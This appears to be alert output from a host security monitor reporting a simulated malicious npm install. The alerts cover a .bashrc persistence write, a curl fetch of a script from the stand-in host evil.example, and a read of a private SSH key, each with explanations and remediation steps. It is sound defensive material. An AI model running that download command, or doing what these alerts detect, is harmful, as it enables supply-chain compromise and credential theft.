alerts.title: Shell startup file modified by a non-editor
alerts.summary: python3 (pid 5240) wrote to /home/moattest/.bashrc. Parent chain: fish -> npm -> python3.

explain.what: python3 wrote to /home/moattest/.bashrc, which runs automatically on your next login.
explain.why: Appending one line to .bashrc or .zshrc is the cheapest persistence on Linux: it runs as you, every terminal, forever, and survives reinstalling the package that dropped it.
evidence: hook: file_post_open on /home/moattest/.bashrc (write)
process: /usr/bin/python3 pid 5240 uid 1000 args -c import os
ancestry: fish -> npm -> python3 (cwd /home/moattest/proj)
policy message: Shell startup file opened for writing
policy action: KPROBE_ACTION_POST (mode monitor; a kill is only recorded once process_exit reports SIGKILL)
not in allowlist: none of the 0 rule(s) in /etc/moat/allowlist.d matches exe=/usr/bin/python3 file=/home/moattest/.bashrc
explain.expected: Installers you ran on purpose - mise, rustup, nvm, conda, starship, atuin, oh-my-zsh - all append to shell rc files during setup.
next: If you did not expect this: stop it now with `moatctl kill <id>` (kills the recorded process tree), and `moatctl quarantine <id>` to move the file out of reach.
Check what was installed: diff the lockfile (`git diff -- package-lock.json pnpm-lock.yaml uv.lock Cargo.lock`) and read the new package's install/postinstall script before you run anything else.
If this was you, run one of the ignore commands above; otherwise `moatctl ack <id>` once you have finished checking.

alerts.title: Package install ran a downloader or decoder
alerts.summary: curl (pid 5250) executed /usr/bin/curl. Parent chain: fish -> npm -> curl.

explain.why: A postinstall script that reaches for curl, wget or base64 is fetching or unpacking something the lockfile never pinned; this is the shape of every recent npm and AUR compromise.
evidence: hook: bprm_check_security on /usr/bin/curl
process: /usr/bin/curl pid 5250 uid 1000 args -fsSL https://evil.example/x.sh
ancestry: fish -> npm -> curl (cwd /home/moattest/proj)
policy message: Downloader or decoder executed inside a package manager process tree
policy action: KPROBE_ACTION_POST (mode monitor; a kill is only recorded once process_exit reports SIGKILL)
not in allowlist: none of the 0 rule(s) in /etc/moat/allowlist.d matches exe=/usr/bin/curl file=/usr/bin/curl
explain.expected: Prebuilt-binary downloaders (node-pre-gyp, sharp, esbuild, playwright, puppeteer), cargo build scripts that fetch toolchains, and PKGBUILDs that curl a release tarball.
next: If you did not expect this: stop it now with `moatctl kill <id>` (kills the recorded process tree), and `moatctl quarantine <id>` to move the file out of reach.
Check what was installed: diff the lockfile (`git diff -- package-lock.json pnpm-lock.yaml uv.lock Cargo.lock`) and read the new package's install/postinstall script before you run anything else.
If this was you, run one of the ignore commands above; otherwise `moatctl ack <id>` once you have finished checking.

alerts.title: Private SSH key read by an unexpected program
alerts.summary: node (pid 5233) read /home/moattest/.ssh/id_ed25519. Parent chain: fish -> npm -> sh -> node.

explain.what: node read your private SSH key (id_ed25519).
explain.why: Private keys are the first thing npm and PyPI stealers read; only ssh, git and a few backup tools ever need them, and a key that leaves the machine gives an attacker every host and forge you can reach.
evidence: hook: file_post_open on /home/moattest/.ssh/id_ed25519 (read)
process: /usr/bin/node pid 5233 uid 1000 args /home/moattest/proj/node_modules/evil/setup.mjs
ancestry: fish -> npm -> sh -> node (cwd /home/moattest/proj)
policy message: Private SSH key opened for reading
policy action: KPROBE_ACTION_SIGKILL (mode monitor; a kill is only recorded once process_exit reports SIGKILL)
not in allowlist: none of the 0 rule(s) in /etc/moat/allowlist.d matches exe=/usr/bin/node file=/home/moattest/.ssh/id_ed25519
explain.expected: Backup tools (restic, borg), IDE git integrations, ansible/terraform runs, and custom scripts that call an ssh library instead of the ssh binary.
next: If you did not expect this: stop it now with `moatctl kill <id>` (kills the recorded process tree), and `moatctl quarantine <id>` to move the file out of reach.
Rotate the SSH key: `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519`, then replace the public key on GitHub (`gh ssh-key add`), on every host in ~/.ssh/config, and in any cloud console that pinned it.
Check what was installed: diff the lockfile (`git diff -- package-lock.json pnpm-lock.yaml uv.lock Cargo.lock`) and read the new package's install/postinstall script before you run anything else.
If this was you, run one of the ignore commands above; otherwise `moatctl ack <id>` once you have finished checking.
